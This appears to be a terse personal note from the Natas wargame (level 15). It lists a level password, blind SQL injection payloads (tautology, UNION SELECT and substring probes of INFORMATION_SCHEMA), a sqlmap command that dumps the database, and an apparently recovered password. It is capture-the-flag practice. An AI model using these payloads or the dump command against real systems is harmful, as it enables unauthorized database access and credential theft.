user:
pass:TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB
![[Pasted image 20230215185504.png]]
"natas16" AND "1"="1
smth" UNION ALL SELECT 1,2;#
smth" UNION ALL SELECT 1,2 FROM INFORMATION_SCHEMA.tables WHERE table_schema !="mysql" AND table_schema != "information_schema" AND table_schema !="performance_schema" AND substring(table_name,1,1)= "p";#
![[Pasted image 20230215194603.png]]
![[Pasted image 20230215194902.png]]
![[Pasted image 20230215194908.png]]
table users
![[Pasted image 20230215204835.png]]

sqlmap -r natas15.req --batch -D natas15 --dump 
![[Pasted image 20230215204911.png]]
TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V